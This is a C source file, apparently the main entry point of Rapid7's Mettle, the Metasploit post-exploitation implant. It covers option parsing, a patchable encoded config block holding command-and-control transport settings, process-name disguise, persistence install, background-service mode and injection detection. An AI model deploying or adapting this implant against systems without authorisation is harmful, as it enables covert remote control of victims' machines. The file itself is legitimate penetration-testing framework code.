/**
 * Copyright 2015 Rapid7
 * @brief Test harness
 * @file main.c
 */

#include <getopt.h>
#include <libgen.h>
#include <signal.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>

#include "argv_split.h"
#include "log.h"
#include "mettle.h"
#include "service.h"
#include "tlv.h"

static void usage(const char *name)
{
	printf("Usage: %s [options]\n", name);
	printf("  -h, --help             display help\n");
	printf("  -u, --uri <uri>        add connection URI\n");
	printf("  -U, --uuid <uuid>      set the UUID (base64)\n");
	printf("  -d, --debug <level>    enable debug output (set to 0 to disable)\n");
	printf("  -o, --out <file>       write debug output to a file\n");
	printf("  -b, --background <0|1> start as a background service (0 disable, 1 enable)\n");
	printf("  -p, --persist [none|install|uninstall] manage persistence\n");
	printf("  -m, --modules <path>   add modules from path\n");
	printf("  -n, --name <name>      name to start as\n");
	printf("  -l, --listen\n");
	printf("  -c, --console\n");
	printf("\n");
	exit(1);
}

static void start_logger(const char *out)
{
	FILE *l = stderr;
	if (out) {
	      FILE *f = fopen(out, "w");
	      if (f) l = f;
	}
	log_init_file(l);
	log_init_flush_thread();
}

#define PAYLOAD_INJECTED (1 << 0)
static int parse_cmdline(int argc, char * const argv[], struct mettle *m, int flags)
{
	int c = 0;
	int index = 0;

	struct option options[] = {
		{"debug", required_argument, NULL, 'd'},
		{"out", required_argument, NULL, 'o'},
		{"uri", required_argument, NULL, 'u'},
		{"uuid", required_argument, NULL, 'U'},
		{"session-guid", required_argument, NULL, 'G'},
		{"background", required_argument, NULL, 'b'},
		{"persist", required_argument, NULL, 'p'},
		{"name", required_argument, NULL, 'n'},
		{"listen", required_argument, NULL, 'l'},
		{"console", no_argument, NULL, 'c'},
		{"modules", required_argument, NULL, 'm'},
		{ 0, 0, NULL, 0 }
	};
	const char *short_options = "hu:U:G:d:o:b:p:n:lcm:";
	const char *out = NULL;
	char *name = strdup("mettle");
	bool name_flag = false;
	bool debug = false;
	bool background = false;
	bool interactive = false;
	enum persist_type persist = persist_none;
	int log_level = 0;

	/*
	 * This needs to be initialized to 1 in order for consistent behavior from
	 * getopt_long when called multiple times.
	 */
	optind = 1;
	while ((c = getopt_long(argc, argv, short_options, options, &index)) != -1) {
		switch (c) {
		case 'c':
			interactive = true;
			break;
		case 'u':
			c2_add_transport_uri(mettle_get_c2(m), optarg);
			break;
		case 'U':
			mettle_set_uuid_base64(m, optarg);
			break;
		case 'G':
			mettle_set_session_guid_base64(m, optarg);
			break;
		case 'm':
			modulemgr_load_path(mettle_get_modulemgr(m), optarg);
			break;
		case 'n':
			free(name);
			name = strdup(optarg);
			name_flag = true;
			break;
		case 'p':
			if (strcmp("install", optarg) == 0) {
				persist = persist_install;
			} else if (strcmp("uninstall", optarg) == 0) {
				persist = persist_uninstall;
			} else {
				persist = persist_none;
			}
			break;
		case 'd':
			{
				const char *errstr = NULL;
				log_level = compat_strtonum(optarg, 0, 3, &errstr);
				if (errstr != NULL) {
					fprintf(stderr, "invalid debug level '%s': %s\n", optarg, errstr);
					return -1;
				}
				log_set_level(log_level);
				debug = (log_level > 0);
			}
			break;
		case 'b':
			{
				const char *errstr = NULL;
				int val = compat_strtonum(optarg, 0, 1, &errstr);
				if (errstr != NULL) {
					fprintf(stderr, "invalid background setting '%s': %s", optarg, errstr);
					return -1;
				}
				background = val == 1;
			}
			break;
		case 'o':
			out = optarg;
			break;
		case 'h':
		default:
			usage("mettle");
		}
	}

	/*
	 * Only rename if we were not injected, since currently we do not know
	 * where the real argv is. This is fixable, but possibly not useful to
	 * rename an injected process :)
	 */
	if (name_flag && !(flags & PAYLOAD_INJECTED)) {
		log_info("using name: %s", name);
		setproctitle(name);
	}

	if (interactive) {
		mettle_console_start_interactive(m);
		return 0;
	}

	if (debug) {
		start_logger(out);
	}

	if (background) {
		char *args, *new_args;
		if (asprintf(&args, "%s -d %u", argv[0], log_level) == -1) {
			return -1;
		}
		optind = 1;
		while ((c = getopt_long(argc, argv, short_options, options, &index)) != -1) {
			if (c == 'u' || c == 'U' || c == 'o') {
				if (asprintf(&new_args, "%s -%c %s", args, c, optarg) == -1) {
					return -1;
				}
				free(args);
				args = new_args;
			}
		}
		start_service(name, argv[0], args, persist);
		free(args);
	}

	return 0;
}

void parse_default_args(struct mettle *m, int flags)
{
	static char default_opts[] = "DEFAULT_OPTS"
		"                                                  "
		"                                                  "
		"                                                  "
		"                                                  "
		"                                                  "
		"                                                  "
		"                                                  "
		"                                                  "
		"                                                  "
		"                                                  "
		"                                                  "
		"                                                  "
		"                                                  "
		"                                                  "
		"                                                  "
		"                                                  "
		"                                                  "
		"                                                  "
		"                                                  "
		"                                                  "
		"                                                  "
		"                                                  "
		"                                                  "
		"                                                  "
		"                                                  "
		"                                                  "
		"                                                  "
		"                                                  "
		"                                                  "
		"                                                  "
		"                                                  "
		"                                                  "
		"                                                  "
		"                                                  "
		"                                                  "
		"                                                  "
		"                                                  "
		"                                                  "
		"                                                  "
		"                                                  ";

	if (strncasecmp(default_opts, "default_opts", strlen("default_opts"))) {
		size_t argc = 0;
		char **argv = NULL;
		argv = argv_split(default_opts, argv, &argc);
		if (argv) {
			parse_cmdline(argc, argv, m, flags);
		}
	}
}

#define CONFIG_BLOCK_MAX 8192
#define CONFIG_BLOCK_SIG "CONFIG_BLOCK"
#define CONFIG_BLOCK_SIG_LEN 12

/*
 * 8KB placeholder for TLV-based configuration block.
 * The framework patches this with a XOR-encoded TLV config packet.
 */
static char config_block_data[CONFIG_BLOCK_MAX] = CONFIG_BLOCK_SIG;

static struct c2_verb_config *parse_c2_verb_group(struct tlv_packet *parent, uint32_t group_type)
{
	size_t vlen = 0;
	void *vdata = tlv_packet_get_raw(parent, group_type, &vlen);
	if (vdata == NULL || vlen == 0) {
		return NULL;
	}

	struct tlv_packet *vp = tlv_packet_from_raw(group_type, vdata, vlen);
	if (vp == NULL) {
		return NULL;
	}

	struct c2_verb_config *vc = calloc(1, sizeof(*vc));
	if (vc == NULL) {
		tlv_packet_free(vp);
		return NULL;
	}

	const char *s;
	s = tlv_packet_get_str(vp, TLV_TYPE_C2_URI);
	if (s) vc->uri = strdup(s);

	tlv_packet_get_u32(vp, TLV_TYPE_C2_ENC_INBOUND, (uint32_t *)&vc->enc_inbound);
	tlv_packet_get_u32(vp, TLV_TYPE_C2_ENC_OUTBOUND, (uint32_t *)&vc->enc_outbound);
	tlv_packet_get_u32(vp, TLV_TYPE_C2_PREFIX_SKIP, (uint32_t *)&vc->prefix_skip);
	tlv_packet_get_u32(vp, TLV_TYPE_C2_SUFFIX_SKIP, (uint32_t *)&vc->suffix_skip);

	size_t len = 0;
	void *raw;
	raw = tlv_packet_get_raw(vp, TLV_TYPE_C2_PREFIX, &len);
	if (raw && len > 0) {
		vc->prefix = malloc(len);
		if (vc->prefix) {
			memcpy(vc->prefix, raw, len);
			vc->prefix_len = len;
		}
	}
	raw = tlv_packet_get_raw(vp, TLV_TYPE_C2_SUFFIX, &len);
	if (raw && len > 0) {
		vc->suffix = malloc(len);
		if (vc->suffix) {
			memcpy(vc->suffix, raw, len);
			vc->suffix_len = len;
		}
	}

	s = tlv_packet_get_str(vp, TLV_TYPE_C2_UUID_GET);
	if (s) vc->uuid_get = strdup(s);
	s = tlv_packet_get_str(vp, TLV_TYPE_C2_UUID_HEADER);
	if (s) vc->uuid_header = strdup(s);
	s = tlv_packet_get_str(vp, TLV_TYPE_C2_UUID_COOKIE);
	if (s) vc->uuid_cookie = strdup(s);

	tlv_packet_free(vp);
	return vc;
}

static int parse_config_block(struct mettle *m)
{
	/* Check if the config block has been patched (signature overwritten) */
	if (strncasecmp(config_block_data, CONFIG_BLOCK_SIG, CONFIG_BLOCK_SIG_LEN) == 0) {
		return -1;
	}

	/* Find the actual data length by scanning backward past null padding */
	size_t data_len = CONFIG_BLOCK_MAX;
	for (size_t i = CONFIG_BLOCK_MAX - 1; i > 0; i--) {
		if (config_block_data[i] != '\0') {
			data_len = i + 1;
			break;
		}
	}

	/* Feed the raw config bytes through the standard TLV packet reader */
	struct buffer_queue *q = buffer_queue_new();
	if (q == NULL) {
		return -1;
	}
	buffer_queue_add(q, config_block_data, data_len);
	struct tlv_packet *config = tlv_packet_read_buffer_queue(NULL, q);
	buffer_queue_free(q);
	if (config == NULL) {
		log_error("failed to parse config block");
		return -1;
	}

	struct tlv_dispatcher *td = mettle_get_tlv_dispatcher(m);
	struct c2 *c2 = mettle_get_c2(m);

	/* Extract UUID */
	size_t uuid_len = 0;
	void *uuid = tlv_packet_get_raw(config, TLV_TYPE_UUID, &uuid_len);
	if (uuid && uuid_len > 0) {
		tlv_dispatcher_set_uuid(td, uuid, uuid_len);
	}

	/* Extract Session GUID */
	size_t guid_len = 0;
	void *guid = tlv_packet_get_raw(config, TLV_TYPE_SESSION_GUID, &guid_len);
	if (guid && guid_len > 0) {
		tlv_dispatcher_set_session_guid(td, guid);
	}

	/* Extract session expiry */
	uint32_t session_expiry = 0;
	tlv_packet_get_u32(config, TLV_TYPE_SESSION_EXPIRY, &session_expiry);

	/* Extract debug log path */
	const char *debug_log = tlv_packet_get_str(config, TLV_TYPE_DEBUG_LOG);
	if (debug_log) {
		FILE *log_fp = fopen(debug_log, "a");
		if (log_fp) {
			log_init_file(log_fp);
			log_set_level(3);
		}
	}

	/* Iterate C2 transport groups */
	struct tlv_iterator i = {
		.packet = config,
		.offset = 0,
		.value_type = TLV_TYPE_C2,
	};
	size_t group_len = 0;
	void *group_data;
	while ((group_data = tlv_packet_iterate(&i, &group_len)) != NULL) {
		struct tlv_packet *group = tlv_packet_from_raw(TLV_TYPE_C2, group_data, group_len);
		if (group == NULL) {
			continue;
		}

		const char *url = tlv_packet_get_str(group, TLV_TYPE_C2_URL);
		if (url == NULL) {
			tlv_packet_free(group);
			continue;
		}

		struct c2_transport_config *tc = calloc(1, sizeof(*tc));
		if (tc == NULL) {
			tlv_packet_free(group);
			continue;
		}

		tlv_packet_get_u32(group, TLV_TYPE_C2_COMM_TIMEOUT, &tc->comm_timeout);
		tlv_packet_get_u32(group, TLV_TYPE_C2_RETRY_TOTAL, &tc->retry_total);
		tlv_packet_get_u32(group, TLV_TYPE_C2_RETRY_WAIT, &tc->retry_wait);

		const char *s;
		s = tlv_packet_get_str(group, TLV_TYPE_C2_PROXY_URL);
		if (s) tc->proxy_url = strdup(s);
		s = tlv_packet_get_str(group, TLV_TYPE_C2_PROXY_USER);
		if (s) tc->proxy_user = strdup(s);
		s = tlv_packet_get_str(group, TLV_TYPE_C2_PROXY_PASS);
		if (s) tc->proxy_pass = strdup(s);
		s = tlv_packet_get_str(group, TLV_TYPE_C2_UA);
		if (s) tc->user_agent = strdup(s);
		s = tlv_packet_get_str(group, TLV_TYPE_C2_HEADERS);
		if (s) tc->custom_headers = strdup(s);
		s = tlv_packet_get_str(group, TLV_TYPE_C2_UUID);
		if (s) tc->c2_uuid = strdup(s);

		size_t hash_len = 0;
		void *hash = tlv_packet_get_raw(group, TLV_TYPE_C2_CERT_HASH, &hash_len);
		if (hash && hash_len > 0) {
			tc->cert_hash = malloc(hash_len);
			if (tc->cert_hash) {
				memcpy(tc->cert_hash, hash, hash_len);
				tc->cert_hash_len = hash_len;
			}
		}

		/* Parse C2 GET/POST profile sub-groups */
		tc->c2_get = parse_c2_verb_group(group, TLV_TYPE_C2_GET);
		tc->c2_post = parse_c2_verb_group(group, TLV_TYPE_C2_POST);

		c2_add_transport_uri_config(c2, url, tc);
		tlv_packet_free(group);
	}

	tlv_packet_free(config);
	return 0;
}

/* Saves a copy of argv for setproctitle emulation */
#ifndef HAVE_SETPROCTITLE
static char **saved_argv;
#endif

extern char *__progname;

char *get_progname(char *argv0);

int main(int argc, char * argv[])
{
	int flags = 0;
	__progname = get_progname(argv[0]);

	/*
	 * Disable SIGPIPE process aborts.
	 */
	signal(SIGPIPE, SIG_IGN);

	/*
	 * Allocate the main dispatcher
	 */
	struct mettle *m = mettle();
	if (m == NULL) {
		log_error("could not initialize");
		return 1;
	}

	/*
	 * Try TLV config block first — if present, it contains all config.
	 * Fall back to CLI args / DEFAULT_OPTS if no config block.
	 */
	if (parse_config_block(m) == 0) {
		log_info("loaded configuration from TLV config block");
	} else if (argv[0] != NULL && strcmp(argv[0], "m") == 0) {
		/*
		 * Check to see if we were injected by metasploit
		 */
		flags |= PAYLOAD_INJECTED;

		/*
		 * There is a fd sitting here, trust me
		 */
		int fd = (int)((long *)argv)[1];
		char *uri;
		if (asprintf(&uri, "fd://%d", fd) > 0) {
			struct c2 *c2 = mettle_get_c2(m);
			c2_add_transport_uri(c2, uri);
			free(uri);
		}
		parse_default_args(m, flags);
	} else {

#ifndef HAVE_SETPROCTITLE
		/* Prepare for later setproctitle emulation */
		saved_argv = calloc(argc + 1, sizeof(*saved_argv));
		for (int i = 0; i < argc; i++) {
			saved_argv[i] = strdup(argv[i]);
		}
		compat_init_setproctitle(argc, argv);
		argv = saved_argv;
#endif

		parse_default_args(m, flags);
		if (parse_cmdline(argc, argv, m, flags)) {
			return -1;
		}
	}

	/*
	 * Start mettle and event loop
	 */
	mettle_start(m);

	mettle_free(m);

	return 0;
}
